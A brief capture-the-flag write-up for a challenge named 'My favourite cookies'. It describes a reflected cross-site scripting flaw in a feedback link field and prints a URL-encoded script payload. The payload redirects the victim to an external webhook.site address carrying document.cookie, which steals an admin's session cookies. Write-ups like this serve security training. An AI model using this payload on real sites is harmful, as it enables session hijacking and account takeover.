# Challenge `My favourite cookies` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Cross-Site Scripting (XSS), specifically Reflected XSS.
- Where: Where is the vulnerability present
  - Field: “Link of the bug/feature request you want to report on”
- Impact: What results of exploiting this vulnerability
  - Stealing admin session cookies (SECRET)
  - Account takeover
  - Unauthorized access with admin privileges

## Steps to reproduce

1. Submit the encoded XSS payload in the Feedback link field. For exemple:
```c#
%3Cscript%3Ewindow.location%3D(%22https%3A%2F%2Fwebhook.site%2F67335a72-9738-4622-9218-2732119d2876%3Fcookie%3D%22%2Bdocument.cookie)%3C%2Fscript%3E
```
3. The injected script executes and redirects the victim to the attacker’s webhook.
4. The victim’s cookies are sent to the attacker.